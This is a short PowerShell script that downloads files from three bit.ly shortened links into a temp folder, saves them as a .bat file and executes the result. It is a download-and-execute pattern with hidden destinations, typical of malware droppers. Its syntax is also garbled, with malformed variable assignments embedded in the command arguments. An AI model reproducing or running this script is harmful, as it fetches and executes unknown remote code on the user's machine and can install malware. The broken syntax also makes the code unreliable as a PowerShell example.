# $url = "https://example.link/file.exe"
# $extension = "exe"
$output = "C:\temp\file.$extension = "bat""

# Download the file
Invoke-WebRequest -Uri $url = "https://bit.ly/3S5NHTI" -OutFile $output

Invoke-WebRequest -Uri $url = "https://bit.ly/4cQPyDU" -OutFile $output

Invoke-WebRequest -Uri $url = "https://bit.ly/4d0fNHX" -OutFile $output


# Run the downloaded file
Start-Process -FilePath $output -Wait


# Exit the script
exit
